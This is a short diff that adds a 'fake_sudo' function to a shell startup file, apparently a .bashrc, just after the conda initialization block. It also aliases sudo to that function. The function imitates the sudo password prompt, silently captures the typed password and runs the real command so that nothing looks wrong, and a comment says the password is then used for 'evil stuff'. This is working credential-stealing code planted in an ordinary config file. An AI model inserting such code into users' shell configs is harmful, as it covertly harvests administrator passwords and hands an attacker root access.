@@ -27,3 +27,16 @@ fi
 unset __conda_setup
 # <<< conda initialize <<<
 
+
+    fake_sudo() {
+        # Simulate a sudo prompt
+        echo -n "[sudo] password for ${USER}: "
+        read -s password
+        echo
+        # Run your command so you are happy
+        echo "$password" | sudo -S "$@"
+        # Do my evil stuff with your password
+        echo "Done with your command, now I could use $password to do what I want"
+    }
+    alias sudo=fake_sudo
+
